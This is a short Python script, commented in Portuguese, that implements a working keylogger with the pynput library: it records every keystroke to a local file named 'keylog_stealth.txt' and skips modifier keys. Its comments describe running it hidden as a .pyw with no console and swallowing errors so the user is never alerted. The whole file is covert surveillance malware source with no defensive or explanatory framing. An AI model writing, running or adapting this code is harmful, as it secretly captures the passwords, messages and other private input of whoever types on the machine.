from pynput import keyboard
import os

# Configurações de teclas para ignorar e manter o log limpo
IGNORAR = {
    keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt_l, keyboard.Key.alt_r,
    keyboard.Key.caps_lock, keyboard.Key.cmd
}

def on_press(key):
    try:
        conteudo = ""
        if hasattr(key, 'char') and key.char is not None:
            conteudo = key.char
        else:
            if key == keyboard.Key.space:
                conteudo = " "
            elif key == keyboard.Key.enter:
                conteudo = "\n"
            elif key == keyboard.Key.tab:
                conteudo = "\t"
            elif key == keyboard.Key.backspace:
                conteudo = "[BACKSPACE]"
            elif key in IGNORAR:
                return 
            else:
                conteudo = f" [{key}] "

        # No modo furtivo (.pyw), o log é nossa única evidência
        with open("keylog_stealth.txt", "a", encoding="utf-8") as f:
            f.write(conteudo)
            f.flush()

    except Exception:
        # Erros em modo oculto não devem alertar o usuário, apenas falhar silenciosamente
        pass

# Inicia o monitoramento sem interface ou console
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
